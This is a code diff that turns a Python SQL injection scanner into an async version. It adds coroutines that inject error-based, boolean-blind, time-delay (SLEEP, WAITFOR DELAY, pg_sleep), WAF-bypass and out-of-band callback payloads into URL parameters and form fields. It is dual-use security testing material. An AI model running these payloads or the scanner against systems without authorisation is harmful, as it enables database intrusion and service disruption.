@@ -1,22 +1,23 @@
 """
-sqli_scanner.py — SQL Injection Scanner with OOB/OAST capability
-=================================================================
+sqli_scanner.py — Async SQL Injection Scanner with OOB/OAST capability
+=======================================================================
 
 Detection methods:
   1. Error-based    — DB error strings in response
   2. Boolean-blind  — TRUE vs FALSE response fingerprinting
   3. Time-based     — statistical baseline median (not flat threshold)
   4. OOB/OAST       — Out-of-band via interactsh DNS callbacks
-                      Catches async blind SQLi that never reflects
 
-Fixes vs previous version:
-  - Boolean-blind: content fingerprint comparison, not just length
-  - Time-based: 3-request baseline median, threshold = median + sleep - 1s
-  - OOB: interactsh HTTP API (no binary install) for DNS/HTTP callbacks
-  - WAF evasion payloads added
+Architecture (v3 — native aiohttp):
+  - scan_url_async() / scan_form_async() use AsyncHTTPSession directly
+  - Zero thread overhead — all I/O is non-blocking coroutines
+  - Time-based payloads run concurrently via asyncio.gather() — event loop
+    handles hundreds of SLEEP(2) payloads simultaneously
+  - Sync scan_url() / scan_form() kept as fallback for standalone use
 """
 from __future__ import annotations
 
+import asyncio
 import re
 import time
 import uuid
@@ -94,13 +95,9 @@ SLEEP_SECONDS   = 2
 JITTER_TOLERANCE = 0.8  # seconds
 
 TIME_PAYLOADS = {
-    "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--", f"1; SELECT SLEEP({SLEEP_SECONDS})--"],
-    "mssql":    [f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
-                 f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--"],
-    "postgres": [f"'; SELECT pg_sleep({SLEEP_SECONDS})--",
-                 f"1; SELECT pg_sleep({SLEEP_SECONDS})--"],
-    "oracle":   [f"' OR 1=1 AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{SLEEP_SECONDS}))--"],
-    "sqlite":   [f"' OR RANDOMBLOB(1000000000)--"],
+    "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--"],
+    "mssql":    [f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--"],
+    "postgres": [f"'; SELECT pg_sleep({SLEEP_SECONDS})--"],
 }
 
 WAF_BYPASS_PAYLOADS = [
@@ -255,7 +252,7 @@ class SQLiScanner:
         return self._oob if self._oob._available else None
 
     # ------------------------------------------------------------------
-    # Public scan methods
+    # Public scan methods (sync — kept for standalone / fallback use)
     # ------------------------------------------------------------------
 
     def scan_url(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
@@ -282,6 +279,257 @@ class SQLiScanner:
             if result:
                 findings.append(result)
         return findings
+
+    # ------------------------------------------------------------------
+    # Async scan methods (native aiohttp — used by AsyncScanEngine v3)
+    # ------------------------------------------------------------------
+
+    async def scan_url_async(self, url: str, params: Dict[str, str],
+                             http) -> List[Dict[str, Any]]:
+        """Fully async URL scan — no threads, no blocking I/O."""
+        findings = []
+        for param in params:
+            result = await self._scan_param_async(url, params, param, http)
+            if result:
+                findings.append(result)
+        return findings
+
+    async def scan_form_async(self, form: Dict[str, Any],
+                              http) -> List[Dict[str, Any]]:
+        """Fully async form scan — no threads, no blocking I/O."""
+        findings = []
+        action   = form.get("action", "")
+        method   = form.get("method", "get").lower()
+        inputs   = form.get("inputs", [])
+        if not action:
+            return []
+
+        fields = {i.get("name", ""): i.get("value", "")
+                  for i in inputs if i.get("name")}
+
+        for field in list(fields.keys()):
+            result = await self._scan_form_field_async(action, method, fields, field, http)
+            if result:
+                findings.append(result)
+        return findings
+
+    # ------------------------------------------------------------------
+    # Async core param scanner
+    # ------------------------------------------------------------------
+
+    async def _scan_param_async(self, url: str, params: Dict[str, str],
+                                target_param: str, http) -> Optional[Dict[str, Any]]:
+        """Async version: try all detection methods in priority order."""
+        # 1. Error-based (fastest)
+        result = await self._error_based_async(url, params, target_param, http)
+        if result:
+            return result
+
+        # 2. Boolean-blind
+        result = await self._boolean_blind_async(url, params, target_param, http)
+        if result:
+            return result
+
+        # 3. Time-based (slowest)
+        result = await self._time_based_async(url, params, target_param, http)
+        if result:
+            return result
+
+        # 4. WAF bypass
+        result = await self._waf_bypass_async(url, params, target_param, http)
+        if result:
+            return result
+
+        # 5. OOB inject (fire-and-forget)
+        await self._oob_inject_async(url, params, target_param, http)
+
+        return None
+
+    async def _error_based_async(self, url: str, params: Dict[str, str],
+                                  target: str, http) -> Optional[Dict[str, Any]]:
+        for payload in ERROR_PAYLOADS:
+            test = dict(params)
+            test[target] = payload
+            resp = await http.get(url, params=test)
+            if resp and self._has_sql_error(resp.text):
+                return {
+                    "type":       "sqli-error",
+                    "param":      target,
+                    "payload":    payload,
+                    "evidence":   self._extract_error(resp.text),
+                    "confidence": 92,
+                    "url":        url,
+                    "method":     "error-based",
+                }
+        return None
+
+    async def _boolean_blind_async(self, url: str, params: Dict[str, str],
+                                    target: str, http) -> Optional[Dict[str, Any]]:
+        baseline_resp = await http.get(url, params=params)
+        if not baseline_resp:
+            return None
+        baseline_fp = self._fingerprint(baseline_resp.text)
+
+        for true_p, false_p in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
+            true_test = dict(params)
+            true_test[target] = true_p
+            false_test = dict(params)
+            false_test[target] = false_p
+
+            # Fire both requests concurrently
+            true_resp, false_resp = await asyncio.gather(
+                http.get(url, params=true_test),
+                http.get(url, params=false_test),
+            )
+            if not true_resp or not false_resp:
+                continue
+
+            true_fp  = self._fingerprint(true_resp.text)
+            false_fp = self._fingerprint(false_resp.text)
+
+            if (self._fingerprints_similar(baseline_fp, true_fp) and
+                    self._fingerprints_differ(true_fp, false_fp)):
+                return {
+                    "type":       "sqli-boolean-blind",
+                    "param":      target,
+                    "payload":    true_p,
+                    "evidence": (
+                        f"TRUE response matches baseline (len={true_fp[0]}), "
+                        f"FALSE differs (len={false_fp[0]})"
+                    ),
+                    "confidence": 82,
+                    "url":        url,
+                    "method":     "boolean-blind",
+                }
+        return None
+
+    async def _time_based_async(self, url: str, params: Dict[str, str],
+                                 target: str, http) -> Optional[Dict[str, Any]]:
+        """
+        Async time-based SQLi: all DB-type payloads fire concurrently via
+        asyncio.gather(). Event loop handles the waits without blocking.
+        """
+        # Baseline: 2 concurrent requests
+        async def measure_baseline():
+            t0 = time.time()
+            await http.get(url, params=params)
+            return time.time() - t0
+
+        baseline_tasks = [measure_baseline() for _ in range(2)]
+        try:
+            baseline_times = await asyncio.gather(*baseline_tasks)
+        except Exception:
+            return None
+
+        baseline_times = [t for t in baseline_times if t is not None]
+        if not baseline_times:
+            return None
+
+        baseline_median = statistics.median(baseline_times)
+        threshold = baseline_median + SLEEP_SECONDS - JITTER_TOLERANCE
+
+        # Fire ALL time-based payloads concurrently across all DB types
+        async def try_time_payload(db_type, payload):
+            test = dict(params)
+            test[target] = payload
+            t0 = time.time()
+            await http.get(url, params=test,
+                          timeout=self.timeout + SLEEP_SECONDS + 2)
+            elapsed = time.time() - t0
+            if elapsed >= threshold:
+                return {
+                    "type":       "sqli-time-blind",
+                    "param":      target,
+                    "payload":    payload,
+                    "evidence": (
+                        f"Response delayed {elapsed:.1f}s "
+                        f"(baseline median={baseline_median:.1f}s, "
+                        f"threshold={threshold:.1f}s, db={db_type})"
+                    ),
+                    "confidence": 80,
+                    "url":        url,
+                    "method":     "time-based",
+                }
+            return None
+
+        time_tasks = []
+        for db_type, payloads in TIME_PAYLOADS.items():
+            for payload in payloads:
+                time_tasks.append(try_time_payload(db_type, payload))
+
+        results = await asyncio.gather(*time_tasks, return_exceptions=True)
+        for r in results:
+            if isinstance(r, dict):
+                return r  # first confirmed hit
+        return None
+
+    async def _waf_bypass_async(self, url: str, params: Dict[str, str],
+                                 target: str, http) -> Optional[Dict[str, Any]]:
+        for payload in WAF_BYPASS_PAYLOADS:
+            test = dict(params)
+            test[target] = payload
+            resp = await http.get(url, params=test)
+            if resp and self._has_sql_error(resp.text):
+                return {
+                    "type":       "sqli-waf-bypass",
+                    "param":      target,
+                    "payload":    payload,
+                    "evidence":   self._extract_error(resp.text),
+                    "confidence": 85,
+                    "url":        url,
+                    "method":     "waf-bypass",
+                }
+        return None
+
+    async def _oob_inject_async(self, url: str, params: Dict[str, str],
+                                 target: str, http) -> None:
+        oob = self._get_oob()
+        if not oob:
+            return
+        tag     = uuid.uuid4().hex[:8]
+        oob_url = oob.generate_payload_url(tag)
+        if not oob_url:
+            return
+
+        inject_tasks = []
+        for db_type, payloads in OOB_PAYLOADS.items():
+            for payload_template in payloads:
+                payload = payload_template.replace("{oob}", oob_url)
+                test    = dict(params)
+                test[target] = payload
+                inject_tasks.append(http.get(url, params=test))
+
+        await asyncio.gather(*inject_tasks, return_exceptions=True)
+        oob.register_injection(oob_url, url, target)
+
+    async def _scan_form_field_async(self, action: str, method: str,
+                                      fields: Dict[str, str], target: str,
+                                      http) -> Optional[Dict[str, Any]]:
+        if method == "post":
+            baseline = await http.post(action, data=fields)
+        else:
+            baseline = await http.get(action, params=fields)
+        if not baseline:
+            return None
+
+        for payload in ERROR_PAYLOADS[:6]:
+            test = dict(fields)
+            test[target] = payload
+            if method == "post":
+                resp = await http.post(action, data=test)
+            else:
+                resp = await http.get(action, params=test)
+            if resp and self._has_sql_error(resp.text):
+                return {
+                    "type":       "sqli-error",
+                    "param":      target,
+                    "payload":    payload,
+                    "evidence":   self._extract_error(resp.text),
+                    "confidence": 92,
+                    "url":        action,
+                    "method":     "error-based",
+                }
+        return None
 
     def collect_oob_findings(self) -> List[Dict[str, Any]]:
         """
